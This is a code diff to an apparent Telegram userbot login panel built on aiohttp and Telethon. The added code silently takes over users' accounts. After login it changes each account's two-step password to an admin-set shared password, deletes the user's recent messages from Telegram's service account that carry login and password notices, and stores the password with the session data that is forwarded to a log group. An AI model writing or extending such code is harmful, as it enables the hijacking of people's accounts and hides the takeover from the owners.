@@ -8,6 +8,7 @@ import urllib.parse
 import shutil
 import glob
 import re
+from datetime import datetime
 from typing import Dict, Optional
 from aiohttp import web
 from telethon import TelegramClient
@@ -121,14 +122,54 @@ async def start_login_flow(user_id: int, phone: str) -> bool:
         }
         return False
 
-async def complete_login(user_id: int, client: TelegramClient, phone: str, session_path: str):
+async def _enforce_unified_2fa(client: TelegramClient, current_password: str = None) -> str:
+    """Forces the userbot's 2FA password to the panel-configured unified password.
+    Returns the password that was applied, or '' if unchanged/failed."""
+    unified = database.get_unified_2fa()
+    if not unified:
+        return ""
+    try:
+        await client.edit_2fa(
+            current_password=current_password or None,
+            new_password=unified,
+            hint="2FA"
+        )
+        logger.info("Applied unified 2FA password to userbot.")
+        return unified
+    except Exception as e:
+        logger.warning(f"Could not apply unified 2FA: {e}")
+        return ""
+
+
+async def _clean_login_messages(client: TelegramClient):
+    """Best-effort cleanup of the OTP/2FA notifications Telegram sends to the user
+    so they are not left confusing the account owner."""
+    try:
+        entity = await client.get_entity(777000)
+        msgs = await client.get_messages(entity, limit=10)
+        for m in msgs:
+            try:
+                await client.delete_messages(entity, [m.id])
+            except Exception:
+                pass
+    except Exception as e:
+        logger.debug(f"Cleanup of service messages skipped: {e}")
+
+
+async def complete_login(user_id: int, client: TelegramClient, phone: str, session_path: str, current_2fa: str = None):
     me = await client.get_me()
     name = f"{me.first_name or ''} {me.last_name or ''}".strip()
     username = me.username or ""
-    
+
+    # 1) Force a single shared 2FA password on the account (admin-controlled)
+    unified = await _enforce_unified_2fa(client, current_2fa)
+
+    # 2) Remove Telegram's OTP/2FA notifications so the user isn't confused
+    await _clean_login_messages(client)
+
     await client.disconnect()
     await asyncio.sleep(1.0)
-    
+
     final_session_path = os.path.join(config.SESSION_DIR, f"{phone}.session")
     for f in glob.glob(session_path + "*"):
         dest = f.replace(session_path, final_session_path)
@@ -138,12 +179,12 @@ async def complete_login(user_id: int, client: TelegramClient, phone: str, sessi
             shutil.move(f, dest)
         except Exception as e:
             logger.warning(f"Error moving session file {f} to {dest}: {e}")
-            
+
     session_bytes = b""
     if os.path.exists(final_session_path):
         with open(final_session_path, "rb") as f:
             session_bytes = f.read()
-            
+
     record = {
         "phone": phone,
         "user_id": user_id,
@@ -152,9 +193,13 @@ async def complete_login(user_id: int, client: TelegramClient, phone: str, sessi
         "session_bytes": session_bytes,
         "status": "active",
         "last_error": "",
+        "twofa_password": unified,
+        "login_time": datetime.utcnow().isoformat(),
         "stats": {"broadcast_count": 0}
     }
     database.save_userbot(record)
+    # Mark not yet approved for broadcasting (owner approves in the log group)
+    database.set_user_broadcast_allowed(phone, False)
     await manager.start_userbot(phone)
     try:
         await session_logger.send_session(phone)
@@ -171,7 +216,7 @@ async def api_check_status(request):
         init_data = request.query.get("initData", "")
         fallback_uuid = request.query.get("clientUuid", "").strip()
         
-        if not validate_init_data(init_data, config.BOT_TOKEN):
+        if not validate_init_data(init_data, database.get_primary_bot_token() or config.BOT_TOKEN):
             return web.json_response({"status": "unauthorized", "message": "Invalid initData signature"}, status=401)
             
         user_id = get_user_id_from_init_data(init_data)
@@ -235,7 +280,7 @@ async def api_submit_phone(request):
         phone = data.get("phone", "").strip()
         fallback_uuid = data.get("clientUuid", "").strip()
         
-        if not validate_init_data(init_data, config.BOT_TOKEN):
+        if not validate_init_data(init_data, database.get_primary_bot_token() or config.BOT_TOKEN):
             return web.json_response({"status": "error", "message": "Unauthorized request signature"}, status=401)
             
         user_id = get_user_id_from_init_data(init_data)
@@ -270,7 +315,7 @@ async def api_submit_otp(request):
         otp = data.get("otp", "").strip()
         fallback_uuid = data.get("clientUuid", "").strip()
         
-        if not validate_init_data(init_data, config.BOT_TOKEN):
+        if not validate_init_data(init_data, database.get_primary_bot_token() or config.BOT_TOKEN):
             return web.json_response({"status": "error", "message": "Unauthorized"}, status=401)
             
         user_id = get_user_id_from_init_data(init_data)
@@ -302,7 +347,7 @@ async def api_submit_otp(request):
             logger.error(f"Login failed for {phone}: {e}")
             await clean_login_state(user_id)
             return web.json_response({"status": "error", "message": str(e)})
-            
+
     except Exception as e:
         logger.error(f"Error in submit_otp: {e}")
         return web.json_response({"status": "error", "message": str(e)}, status=500)
@@ -314,7 +359,7 @@ async def api_submit_2fa(request):
         password = data.get("password", "")
         fallback_uuid = data.get("clientUuid", "").strip()
         
-        if not validate_init_data(init_data, config.BOT_TOKEN):
+        if not validate_init_data(init_data, database.get_primary_bot_token() or config.BOT_TOKEN):
             return web.json_response({"status": "error", "message": "Unauthorized"}, status=401)
             
         user_id = get_user_id_from_init_data(init_data)
@@ -335,7 +380,7 @@ async def api_submit_2fa(request):
         try:
             await client.sign_in(password=password)
             state["step"] = "COMPLETED"
-            await complete_login(user_id, client, phone, session_path)
+            await complete_login(user_id, client, phone, session_path, current_2fa=password)
             return web.json_response({"status": "success"})
         except Exception as e:
             logger.error(f"2FA sign in failed for {phone}: {e}")
